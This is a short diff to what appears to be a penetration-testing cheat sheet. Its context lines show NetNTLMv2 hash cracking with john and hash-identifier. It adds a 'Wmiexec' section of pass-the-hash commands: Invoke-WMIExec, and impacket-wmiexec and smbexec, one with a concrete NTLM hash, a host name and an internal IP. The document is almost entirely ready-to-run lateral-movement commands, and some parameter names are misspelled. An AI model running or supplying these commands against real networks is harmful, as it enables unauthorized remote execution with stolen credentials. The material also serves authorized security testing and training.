@@ -22,3 +22,16 @@ john <hash> --wordlist=/.../rock.. --format=netntlmv2
 ```
 hash-identifier <hash>
 ```
+
+**4. Wmiexec**
+```
+Invoke-WMIExec -Targt <IP> -Domain <domain> -Username <user> -Hash <hash> -Comand 'cmd /c"echo hello_world"'
+```
+
+```
+impacket-wmiexec -hashes 00000000000000000000000000000000:e19ccf75ee54e06b06a5907af13cef42 daniel-win10/admin@192.168.12.157
+```
+
+```
+Impacket-smbexec -hashes '<hash>' '<domain>/<user>@<IP>'
+```
